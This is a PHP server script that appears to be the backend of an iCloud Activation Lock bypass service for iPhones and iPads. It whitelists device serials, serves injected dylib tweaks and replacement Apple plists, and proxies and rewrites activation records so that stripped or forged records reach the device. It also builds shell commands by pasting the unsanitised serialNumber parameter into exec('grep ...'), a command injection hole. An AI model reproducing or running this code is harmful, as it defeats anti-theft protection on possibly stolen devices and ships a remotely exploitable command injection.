<?php
header_remove();
ini_set('default_charset', '');

if (isset($_GET['acctts']))
{
	if ($_GET['acctts'] == 'startBypass')
	{
    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","startBypass":true}';
		exit;
	}
	elseif ($_GET['acctts'] == 'existsCheck')
	{
    	header('Content-Type: text/html; charset=UTF-8');

		if(isset($_GET['serialNumber']) && strlen($_GET['serialNumber']) == 12 || strlen($_GET['serialNumber']) == 11) {
			if(!exec("grep ".$_GET['serialNumber']." ./var/www/files/whitelisted.log"))
			{ 
				$model = file_get_contents(''.$_GET['serialNumber']);
				$model = explode(',', $model);
				unset($model[0]);
				$model = implode(', ', array_filter($model));

				if(!empty($model) ) { $model = 'Model: '.$model;}
				else { $model = 'Model: Unknown'; }
				file_put_contents('./var/www/files/upcoming.log', "SN: ".$_GET['serialNumber']." - $model \n", FILE_APPEND);
				header("ARS: cHl4S0JOY0w4YzRrUHZJUEhFeEI=");
				echo '{"data":"eyJzdGF0dXMiOiIxIiwiZXhpc3RzX2NoZWNrIjpmYWxzZX0=","signature":"OGJlNjU3OTU4MjNlNmYxYjkyODhkNmNjNWQxM2JiMWI="}';
			} else {
				header("ARS: Wm5iNTR2cHJBQ3Zpb1BnNEs0SzE=");
				echo '{"data":"eyJzdGF0dXMiOiIxIiwiZXhpc3RzX2NoZWNrIjoiYnlwYXNzQ2xvdWRCYXNlYmFuZF9QS0cyIn0=","signature":"ZGM0YTIxNGY2MmM5NTk5YzA3NjI4ZDQ4YjFlOTVhYWY="}';
			}
		} else {
		echo "ERROR";
		}
	}

	elseif($_GET['acctts'] == 'getConfig')
	{
		//checkRegistered($_GET['serialNumber']);

		header("ARS: UERsajlOQjJ2NVZPNFlvWE5oa1U=");
		echo '{"data":"eyJpUGFkNiwzIjoiYnlwYXNzQ2xvdWRfUEtHMSIsImlQYWQ2LDQiOiJieXBhc3NDbG91ZF9QS0cxIiwiaVBhZDYsNyI6ImJ5cGFzc0Nsb3VkX1BLRzEiLCJpUGFkNiw4IjoiYnlwYXNzQ2xvdWRfUEtHMSIsImlQYWQ2LDExIjoiYnlwYXNzQ2xvdWRfUEtHMSIsImlQYWQ2LDEyIjoiYnlwYXNzQ2xvdWRfUEtHMSIsImlQYWQ3LDEiOiJieXBhc3NDbG91ZF9QS0cxIiwiaVBhZDcsMiI6ImJ5cGFzc0Nsb3VkX1BLRzEiLCJpUGFkNywzIjoiYnlwYXNzQ2xvdWRfUEtHMSIsImlQYWQ3LDQiOiJieXBhc3NDbG91ZF9QS0cxIiwiaVBhZDcsNSI6ImJ5cGFzc0Nsb3VkX1BLRzEiLCJpUGFkNyw2IjoiYnlwYXNzQ2xvdWRfUEtHMSIsImlQYWQ3LDExIjoiYnlwYXNzQ2xvdWRfUEtHMSIsImlQYWQ3LDEyIjoiYnlwYXNzQ2xvdWRfUEtHMSIsImlQaG9uZTksMyI6ImJ5cGFzc0Nsb3VkQmFzZWJhbmRfUEtHMiIsImlQaG9uZTksNCI6ImJ5cGFzc0Nsb3VkQmFzZWJhbmRfUEtHMiIsImlQaG9uZTEwLDQiOiJieXBhc3NDbG91ZEJhc2ViYW5kX1BLRzMiLCJpUGhvbmUxMCw1IjoiYnlwYXNzQ2xvdWRCYXNlYmFuZF9QS0czIiwiaVBob25lMTAsNiI6ImJ5cGFzc0Nsb3VkQmFzZWJhbmRfUEtHMyIsImlQYWQyLDIiOiJieXBhc3NDbG91ZEJhc2ViYW5kX1BLRzQiLCJpUGFkMiw2IjoiYnlwYXNzQ2xvdWRCYXNlYmFuZF9QS0c0IiwiaVBhZDMsMyI6ImJ5cGFzc0Nsb3VkQmFzZWJhbmRfUEtHNCIsImlQYWQzLDUiOiJieXBhc3NDbG91ZEJhc2ViYW5kX1BLRzQiLCJpUGhvbmU2LDEiOiJieXBhc3NDbG91ZF9QS0c1IiwiaVBob25lNiwyIjoiYnlwYXNzQ2xvdWRfUEtHNSIsImlQaG9uZTcsMSI6ImJ5cGFzc0Nsb3VkX1BLRzUiLCJpUGhvbmU3LDIiOiJieXBhc3NDbG91ZF9QS0c1IiwiaVBob25lOCwxIjoiYnlwYXNzQ2xvdWRfUEtHNSIsImlQaG9uZTgsMiI6ImJ5cGFzc0Nsb3VkX1BLRzUiLCJpUGhvbmU4LDQiOiJieXBhc3NDbG91ZF9QS0c1IiwiaVBob25lOSwxIjoiYnlwYXNzQ2xvdWRfUEtHNiIsImlQaG9uZTksMiI6ImJ5cGFzc0Nsb3VkX1BLRzYiLCJpUGhvbmUxMCwxIjoiYnlwYXNzQ2xvdWRfUEtHNyIsImlQaG9uZTEwLDIiOiJieXBhc3NDbG91ZF9QS0c3IiwiaVBob25lMTAsMyI6ImJ5cGFzc0Nsb3VkX1BLRzciLCJpUGFkMiwxIjoiYnlwYXNzQ2xvdWRfUEtHOCIsImlQYWQyLDMiOiJieXBhc3NDbG91ZF9QS0c4IiwiaVBhZDIsNCI6ImJ5cGFzc0Nsb3VkX1BLRzgiLCJpUGFkMiw1IjoiYnlwYXNzQ2xvdWRfUEtHOCIsImlQYWQyLDciOiJieXBhc3NDbG91ZF9QS0c4IiwiaVBhZDMsMSI6ImJ5cGFzc0Nsb3VkX1BLRzgiLCJpUGFkMywyIjoiYnlwYXNzQ2xvdWRfUEtHOCIsImlQYWQzLDQiOiJieXBhc3NDbG91ZF9QS0c4IiwiaVBhZDMsNiI6ImJ5cGFzc0Nsb3VkX1BLRzgiLCJpUGFkNCwxIjoiYnlwYXNzQ2xvdWRfUEtHOCIsImlQYWQ0LDIiOiJieXBhc3NDbG91ZF9QS0c4IiwiaVBhZDQsMyI6ImJ5cGFzc0Nsb3VkX1BLRzgiLCJpUGFkNCw0IjoiYnlwYXNzQ2xvdWRfUEtHOCIsImlQYWQ0LDUiOiJieXBhc3NDbG91ZF9QS0c4IiwiaVBhZDQsNiI6ImJ5cGFzc0Nsb3VkX1BLRzgiLCJpUGFkNCw3IjoiYnlwYXNzQ2xvdWRfUEtHOCIsImlQYWQ0LDgiOiJieXBhc3NDbG91ZF9QS0c4IiwiaVBhZDQsOSI6ImJ5cGFzc0Nsb3VkX1BLRzgiLCJpUGFkNSwxIjoiYnlwYXNzQ2xvdWRfUEtHOCIsImlQYWQ1LDIiOiJieXBhc3NDbG91ZF9QS0c4IiwiaVBhZDUsMyI6ImJ5cGFzc0Nsb3VkX1BLRzgiLCJpUGFkNSw0IjoiYnlwYXNzQ2xvdWRfUEtHOCJ9","signature":"NjY4ZGQ5OTM1MjEzZGJjNDkyZjZkZTkwYjY5MjlkNzU="}';
	}
	elseif($_GET['acctts'] == 'createInvoice')
	{
		//checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		if(exec("grep ".$_GET['serialNumber']." ./var/www/files/whitelisted.log")) { 
			echo '{"status":"1	","OK"}';
		} else {
			echo '{"status":"1","createInvoice":"18cb8ccdd35bc44a54b72d1bde71974b10b30820"}';
		}
	}
	elseif($_GET['acctts'] == 'checkJail')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","checkJail":true}';
	}
	elseif($_GET['acctts'] == 'connectedViaSsh')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","connectedViaSsh":true}';
	}
	elseif($_GET['acctts'] == 'uploadEnv')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","uploadEnv":true}';
	}
	elseif($_GET['acctts'] == 'movedEnv')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","movedEnv":true}';
	}
	elseif($_GET['acctts'] == 'getTweakPlist')
	{
		checkRegistered($_GET['serialNumber']);

		$file = './var/www/files/simpleNew.plist';
		if (file_exists($file)) {
    		header('Content-Type: application/plist, application/octet-stream');
    		header('Content-Disposition: attachment; filename="simple.plist"');
    		header('Content-Length: ' . filesize($file));
    		readfile($file);
    		exit;
		}
	}
	elseif($_GET['acctts'] == 'getTweak')
	{
		checkRegistered($_GET['serialNumber']);

		$file = './var/www/files/simpleNew.dylib';
		if (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '12.5') !== false) {
			$file = './var/www/files/simple.dylib';
		} elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '12.5') !== false) {
			$file = './var/www/files/simple136.dylib';
		}	elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '13.6.1') !== false) {
			$file = './var/www/files/simple136.dylib';
		}	elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '13.6') !== false) {
			$file = './var/www/files/simple136.dylib';
		}	elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '12.4.9') !== false) {
			$file = './var/www/files/simple136.dylib';
		}	elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '13.4') !== false) {
			$file = './var/www/files/simple136.dylib';
		}	elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '13.5') !== false) {
			$file = './var/www/files/simple136.dylib';
		}	elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '13.7') !== false) {
			$file = './var/www/files/simple136.dylib';
		}	elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '14.3') !== false) {
			$file = './var/www/files/simple136.dylib';
		} elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '14.2') !== false) {
			$file = './var/www/files/simple136.dylib';
		}
		if (file_exists($file)) {
    		header('Content-Type: application/octet-stream');
    		header('Content-Disposition: attachment; filename="simple.dylib"');
    		readfile($file);
    		exit;
		}
	}
	elseif($_GET['acctts'] == 'sendHandshake')
	{
		checkRegistered($_GET['serialNumber']);

		$data = str_replace('blob=', '', urldecode(file_get_contents('php://input')));
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Accept: application/xml"));
		curl_setopt($ch, CURLOPT_URL, "https://albert.apple.com/deviceservices/drmHandshake");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$result = curl_exec($ch);
		curl_close ($ch);
		file_put_contents('./var/www/log43221.txt', $data."\n-\n".$result);
		if(empty($result)) die('Connection Error');
		header('Content-Type: application/xml');
		echo $result;
	}
	elseif($_GET['acctts'] == 'sendActivationPreJail')
	{
		checkRegistered($_GET['serialNumber']);

		$data = str_replace('activationInfo=', '', urldecode(file_get_contents('php://input')));
		$activationinfo = http_build_query(array('activation-info' => $data ));
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Accept: text/xml"));
		curl_setopt($ch, CURLOPT_URL, "http://example.com/xXx/v2.php?v=1");
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $activationinfo);
		curl_setopt($ch, CURLOPT_VERBOSE, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		$albert = curl_exec($ch);
		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		$content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
		$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($albert, 0, $header_size);
		$body = substr($albert, $header_size);
		curl_close ($ch);
		$albertHeaderSize = $header_size;
		$albertBodySize = strlen($body);	
		http_response_code($httpcode);
		if (strpos($header, 'ARS') !== false) {
			$ARS = explode("\r\nARS: ", $header);
			$ARS = explode("\r\n", $ARS[1]);
			$ARS = $ARS[0];
			header("ARS: " . $ARS);
		} else { $ARS = ''; }
		header('Content-Type: application/xml');
		header("Content-Length: " . strlen($body));
		echo $body;
	}
	elseif($_GET['acctts'] == 'fixWorking')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","fixWorking":true}';
	}
	elseif($_GET['acctts'] == 'activating')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","activating":true}';
	}
	elseif($_GET['acctts'] == 'sendActivationJail')
	{
		checkRegistered($_GET['serialNumber']);

		$data = str_replace('activationInfo=', '', urldecode(file_get_contents('php://input')));
		$activationinfo = http_build_query(array('activation-info' => $data ));
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Accept: text/xml"));
		curl_setopt($ch, CURLOPT_URL, "http://example.com/xXx/v2.php?v=2");
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $activationinfo);
		curl_setopt($ch, CURLOPT_VERBOSE, 1);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		$albert = curl_exec($ch);
		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		$content_type = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
		$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($albert, 0, $header_size);
		$body = substr($albert, $header_size);
		curl_close ($ch);

		$albertHeaderSize = $header_size;
		$albertBodySize = strlen($body);	
		http_response_code($httpcode);
		if (strpos($header, 'ARS') !== false) {
			$ARS = explode("\r\nARS: ", $header);
			$ARS = explode("\r\n", $ARS[1]);
			$ARS = $ARS[0];
			header("ARS: " . $ARS);
		} else { $ARS = ''; }

		if(strpos($body, 'AccountTokenCertificate') !== false) {
			$data = ActivationRecordXML($body);
			if (isset($data['UniqueDeviceCertificate'])) { $body = str_replace('<key>UniqueDeviceCertificate</key>', '', str_replace('<data></data>', '', str_replace($data['UniqueDeviceCertificate'], '', $body))); }
			$body = str_replace('ActivationRecord</key><dict><key>unbrick</key><true/>', 'iphone-activation</key><dict><key>unbrick</key><true/><key>LDActivationVersion</key><integer>2</integer><key>activation-record</key><dict>', $body);
//			$updatedToken = base64_encode(str_replace(array('ActivationTicket', '	"MobileEquipmentIdentifier" = "35582608208852";'."\n"), array('WildcardTicket', ''), base64_decode($data['AccountToken'])));
//			$body = str_replace($data['AccountToken'], $updatedToken, $body);
		}


		header('Content-Type: application/xml');
		header("Content-Length: " . strlen($body));
		echo $body;
	}
	elseif($_GET['acctts'] == 'getSetupPlist')
	{
		checkRegistered($_GET['serialNumber']);

		$file = './var/www/files/getSetupPlistNew.plist';
		if (file_exists($file)) {
    		header('Content-Type: application/octet-stream');
    		header('Content-Disposition: attachment; filename="com.apple.purplebuddy.plist"');
    		readfile($file);
    		exit;
		}
	}
	elseif($_GET['acctts'] == 'activated')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		header('Content-Length: 51');
		echo '{"status":"1","activated":true}';
	}
	elseif($_GET['acctts'] == 'getCloudPlist')
	{
		checkRegistered($_GET['serialNumber']);

		if (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '13.7') !== false) {
			$file = './var/www/files/getCloudPlist-135.plist';
		}
		elseif (isset($_GET['productVersion']) && strpos($_GET['productVersion'], '12.4.8') !== false) {
			$file = './var/www/files/getCloudPlist-136.plist';
		}
		elseif ($_GET['serialNumber'] == 'DNPMQ0U9FFGD') {
			$file = './var/www/files/getCloudPlist-test.plist';
		} else {
			$file = './var/www/files/getCloudPlist.plist';
		}	
		if (file_exists($file)) {
    		header('Content-Type: application/octet-stream');
    		header('Content-Disposition: attachment; filename="com.apple.commcenter.device_specific_nobackup.plist"');
    		readfile($file);
    		exit;
		}
	}
	elseif($_GET['acctts'] == 'activateBB')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","activateBB":true}';
	}
	elseif($_GET['acctts'] == 'uploadedData')
	{
		checkRegistered($_GET['serialNumber']);

    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","uploadedData":true}';
	}
	elseif($_GET['acctts'] == 'done')
	{
		checkRegistered($_GET['serialNumber']);
		
    	header('Content-Type: text/html; charset=UTF-8');
		echo '{"status":"1","done":true}';
	}
}

function ActivationRecordXML($xml){
	if (strpos($xml, 'AccountTokenCertificate') == false) return 'Error: 377';
	$xml = simplexml_load_string($xml);
	$keys = json_decode(json_encode($xml->dict->dict->dict->key),1);
	
	if(empty($keys)) { $keys = json_decode(json_encode($xml->dict->dict->key),1); $data = json_decode(json_encode($xml->dict->dict->data),1); }
	else {  $data = json_decode(json_encode($xml->dict->dict->dict->data),1); }
	
	if($keys[0] == 'unbrick' ) array_shift($keys);
	foreach ($keys as $keyident => $keystore) { $keydata[$keystore] = $data[$keyident]; }
	$AccountToken = str_replace(	array('{','}','"',"\n","\t"), array('','','','',''), base64_decode($keydata['AccountToken']) );
	array_walk(explode(';', $AccountToken), function (&$value,$key) use (&$keydata) {
    	list($k, $v) = explode(' = ', $value);
    	if ($v) $keydata[$k] = $v;
	});
	if ($keydata) return $keydata;
}

function checkRegistered($serial)
{
	if ( !exec("grep ".$serial." ./var/www/files/whitelisted.log") )
	{ 
		die();
	}
}

?>
